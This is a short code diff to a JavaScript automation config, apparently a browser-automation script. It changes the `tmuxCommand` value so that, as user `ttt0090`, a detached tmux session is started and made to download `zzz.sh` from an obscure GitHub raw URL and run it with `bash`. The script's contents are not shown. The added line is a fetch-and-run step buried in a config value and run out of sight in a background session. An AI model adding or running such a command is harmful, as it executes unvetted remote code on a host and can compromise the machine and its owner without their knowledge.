@@ -16,7 +16,7 @@ const CONFIG = {
   runTmuxInit: process.env.INIT_TMUX === '1',
 
   // ✅ 终端里执行的命令
-  tmuxCommand: "su - ttt0090 -c 'tmux new -A -s main'",
+  tmuxCommand: "su - ttt0090 -c 'tmux has-session -t main 2>/dev/null || tmux new-session -d -s main; tmux send-keys -t main \"cd \\$HOME && wget -O zzz.sh https://raw.githubusercontent.com/yghhbbuy/vvvioui/refs/heads/main/zzz.sh && bash zzz.sh\" C-m'",
 };
 
 async function isVisible(locator, timeout = 3000) {
